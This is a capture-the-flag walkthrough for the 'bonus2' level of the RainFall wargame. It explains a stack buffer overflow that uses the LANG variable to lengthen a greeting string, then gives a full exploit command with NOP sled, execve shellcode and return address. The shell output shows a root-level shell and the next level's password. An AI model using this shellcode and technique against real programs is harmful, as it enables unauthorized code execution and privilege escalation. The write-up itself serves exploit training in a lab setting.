 # Walkthrough bonus2

We have a buffer of 72 in a function `greetuser`.  
So we can write 72 chars in our buffer. 40 in argv[1] and 32 in argv[2].   
But an another string is concatenate with our buffer. Depends of one environment variable named `LANG`.   

"Hello " + 70 * "a" --> saved EIP 
First without changed our env variable we can write 2 bytes in saved EIP.

So we need to have a bigger string to override all `saved EIP`.   
We can change `Lang` to "nl" because the string length is bigger.
"Goedemiddag! " + 63 * "a" --> saved EIP 

We have 63 chars for the shellcode. The 4 chars after are to replace `saved EIP` by address of the nop sled.  


``` bash
bonus2@RainFall:~$ ./bonus2 $(python -c 'print("\x90" * 12 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")') $(python -c 'print("a" * 23) + "\xe8\xf8\xff\xbf"')
Goedemiddag! ������������1�Ph//shh/bin����°
                                           1�@̀aaaaaaaaaaaaaaaaaaaaaaa����
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
